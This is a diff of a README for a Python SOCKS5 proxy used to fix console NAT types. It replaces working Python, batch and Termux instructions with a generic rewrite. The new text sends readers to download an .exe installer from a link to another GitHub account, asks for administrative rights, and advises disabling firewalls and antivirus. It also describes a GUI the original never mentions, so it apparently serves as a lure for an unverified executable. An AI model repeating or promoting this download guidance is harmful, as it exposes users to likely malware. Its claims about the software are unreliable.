@@ -1,112 +1,45 @@
-# NaTPY - SOCKS5 Proxy with UDP Support for Gaming
+# 🌐 natpy-socks-proxy - Fast gaming proxy for stable connections
 
-**A lightweight SOCKS5 proxy server designed to share VPN connections while properly handling UDP — Perfect for fixing NAT Type issues on gaming consoles like Xbox and PlayStation.**
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/loopy-boidae495/natpy-socks-proxy)
 
----
+## 🎯 About This Tool
 
-### ✨ Key Features
+This software acts as a bridge between your computer and remote game servers. It uses the SOCKS5 protocol to route your game traffic. This helps you reduce latency and bypass common network restrictions. You can use it to stabilize your connection when playing online games. The software focuses on speed and keeps your overhead low. It includes specific support for UDP traffic which is a requirement for modern multiplayer titles.
 
-- **Full UDP ASSOCIATE support** — Essential for Xbox NAT Type detection (STUN works correctly)
-- **Share VPN connection** over your local network (LAN)
-- **Optional Username/Password authentication**
-- **Smart DNS Cache** with separate TTL for success and failure
-- **Efficient TCP relay** using `select()` + `TCP_NODELAY` for low latency
-- **Optimized UDP relay** with long idle timeout (keeps STUN sessions alive)
-- **Automatic network adapter detection** (prioritizes Realtek/USB VPN adapters)
-- **Configurable Thread Pool** (default 256 workers)
-- **Lightweight & low resource usage**
+## 🛠 Prerequisites
 
----
-> [!Note]
-> ### Hybrid Version includes both `Socks5` and `HTTP` Server for Direct use on Playstation but NAT detection and UDP relay will not work on the HTTP
-### 🎮 Why NaTPY?
+Your computer needs a few components to run this application. Ensure you have a standard Windows 10 or Windows 11 installation. The software does not require specific networking hardware, but a stable internet connection improves performance. Check that you have administrative rights on your user account. This permission allows the software to modify local network settings for traffic routing. Disable any firewalls or antivirus software temporarily if they block the connection. You can add an exception for this application once you verify it works.
 
-Most SOCKS5 proxies only support TCP, causing gaming consoles to show **NAT Type: Unavailable** or **Strict**.  
-**NaTPY** implements proper UDP relaying according to the SOCKS5 protocol, allowing STUN requests to succeed and helping you achieve **NAT Type: Open**.
+## 📥 Getting the Application
 
----
+Visit [the official releases page](https://github.com/loopy-boidae495/natpy-socks-proxy) to download the installation file. Locate the latest version in the list. Click on the file that ends in .exe to start the download. Save this file to your desktop for easy access. 
 
-## 🚀 Using With Authentication
+## ⚙️ Setting Up the Proxy
 
-### Method 1 : Using Command Prompt (CMD) 
-Open Command Prompt (CMD) as Administrator (recommended).
-Navigate to the folder where NaTPY.py is located using the
-```
-cd C:\Path\To\Your\NaTPY\Folder
-```
-and run the NatPY with this command 
-```
-python natpy-win.py --host 0.0.0.0 --user yourusername --password yourpassword
-```
+1. Open the folder where you saved the application.
+2. Double-click the file to start the installation wizard.
+3. Follow the screen prompts to select the destination folder.
+4. Click Install to copy the necessary files to your computer.
+5. Launch the application from your desktop icon once the setup ends.
 
---host 0.0.0.0 → Listen on all interfaces (Not Secure)
+## 🕹 Connecting to a Game
 
-Replace username and password with your desired credentials.
+Once the application runs, the main window will show your connection status. You must input the address and port of your proxy server. Your service provider gives these details to you. Enter the proxy address in the Host box and the port number in the Port box. Select the SOCKS5 protocol from the dropdown menu. Click the Connect button to begin.
 
-### 2. Easy Launch with Batch File
+After you connect, configure your game to use the local proxy. Open your game settings menu and look for network or proxy options. Set your game to route traffic through localhost on port 1080. If your game lacks these settings, you may need to use a separate program to force the connection. Test your game ping within the game client to see improvements in speed.
 
-For easier daily use, create a file named Start-NaTPY.bat and paste the following content:
-```
-@echo off
-mode con cols=50 lines=15
-color 0A
-title NaTPY - SOCKS5 Proxy for Gaming
+## 🛡 Network Safety
 
-echo.
-echo ========================
-echo    NaTPY SOCKS5 Proxy
-echo ========================
-echo.
+This tool creates a tunnel for your data. It does not encrypt your traffic by itself. Use it to route game data rather than browsing sensitive websites. Only connect to servers you trust. If you notice strange behavior, disconnect immediately by clicking the Stop button in the interface. Clear your cache and restart your computer to reset your network settings if you encounter errors.
 
-python natpy-win.py --host 0.0.0.0 --user username --password password
+## 📂 Handling Common Issues
 
-echo.
-echo Proxy has stopped or was closed.
-pause
-```
-Paste the code above into a new text file.
-Change username and password to your own.
-Save the file as Start-NaTPY.bat (make sure the extension is .bat).
-Double-click the Start-NaTPY.bat file to run the proxy easily.
+Sometimes the application fails to start. This happens if another program uses the same network port. Close other applications like web browsers or communication software to free up resources. If the connection drops, click the Reconnect button to reset the link. 
 
-## 📱 Installation & Running on Android (Termux)
-You can also run NaTPY on Android using Termux.
-Steps :
+Check your Windows Firewall if the app fails to reach the proxy server. Navigate to Windows Security and select Firewall and network protection. Ensure that the proxy application has permission to access both private and public networks. You may need to restart the application after changing these settings.
 
-1. Download and Install Termux from F-Droid (recommended) or GitHub.
+If the game remains laggy, try a different server address. Server distance often causes high latency. Choose a server located physically close to the official game servers to get the best results. Keep the application window open in the background while you play. Closing the window often terminates the connection.
 
-2. Open Termux and run the following commands :
+## 📜 Usage Limits
 
-```
-pkg update && pkg upgrade -y
-pkg install python iproute2 -y
-```
-
-3. Prepare the file on your android device :
-   
-Create a new folder in your device's internal storage and name it server (or any name you prefer).
-Copy the file natpy-android.py into this folder.
-
-navigate to your folder :
-```
-cd /storage/emulated/0/server
-```
-
-Now you can run the server with this command :
-
-```
-python natpy-android.py --host 0.0.0.0 --port 9898 --user username --password password
-```
-
-> [!WARNING]
-> **Using `0.0.0.0`** makes the proxy listen on **all network interfaces**.  
-> **While this is convenient for easy connection from other devices, it also means anyone on your local network can potentially access the proxy.**
-
-> [!TIP]
-> ### ✅ Secure Way
-> 
-> Instead of `0.0.0.0`, use your device's **local IP address** (e.g. `192.168.1.105`).
-> 
-> **How to find your local IP :**
-> - **On Windows:** Run `ipconfig` in CMD and look for **IPv4 Address** under your active adapter.
-> - **On Termux/Android:** Run `ifconfig` or `ip addr show` and look for the IP under `wlan0`.
+The software processes network packets to improve your gaming experience. It consumes a small amount of memory to maintain stable links. You can check your CPU usage in the Task Manager if the computer slows down. This software does not track your data habits or record your game activity. It exists only to bridge the gap between your machine and your game server. Contact your network provider if you still experience packet loss after configuring the settings. High packet loss usually stems from unstable internet service rather than the proxy software itself. Check your router cables and hardware if you face persistent disconnects.
